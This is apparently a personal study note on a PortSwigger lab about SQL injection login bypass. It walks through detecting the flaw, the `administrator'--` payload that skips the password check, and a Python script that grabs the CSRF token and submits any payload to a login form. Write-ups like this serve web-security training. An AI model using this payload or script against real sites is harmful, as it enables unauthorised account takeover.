---
category: lab
tags:
  - training/web
  - vuln/sqli
platform: portswigger
status: done
completed_date:
created: 2025-05-31
aliases:
  - SQLi Lab - Login Bypass
---

## Lab: [[[vuln--sql-injection]] vulnerability allowing login bypass](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass)

> This lab contains a SQL injection vulnerability in the login function.
	To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---
### Finding SQLI
Trying SQL characters, here `'` to check if the server is vulnerable to SQLI
Using burp-repeater to send `administrator'` as username gives -> **Internal Server Error** -> SQLi existence confirmed
![[images/sqli-lab2-burp-repeater.png]]

### Guessing Backend Query
```sql
	SELECT user from users WHERE username='admin' and password='admin'
```
### Attacking
Using the SQLi `administrator'-- ` results in the following query:
```sql
	SELECT user from users WHERE username='administrator'-- and password='admin'
```
If the administrator user exists, we will be authenticated as the password is skipped using the injection

 **Used payload->**  `administrator'--`
---
# Pythonizing for Automating
```python
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'} 

def get_csrf_token(sess,url):
    req=sess.get(url, verify=False, proxies=proxies)
    token=BeautifulSoup(req.text, 'html.parser')
    csrf=token.find("input")['value']
    print(f"CSRF: {csrf}")
    return csrf

def exploit_sqli(sess, url,payload):
    csrf=get_csrf_token(sess,url)
    form_data={
        "csrf" : csrf,
        "username" : payload,
        "password" : "anything"
    }
    res = sess.post(url, data=form_data, verify=False, proxies=proxies)
    if "Update email" in res.text:
        return True
    else:
        return False
    
if __name__=="__main__":
    try:
        url= sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <URL> <Payload>")
    
    sess = requests.Session()
    if exploit_sqli(sess, url, payload):
        print("Successful")
    else:
        print("Unsuccessful")
```
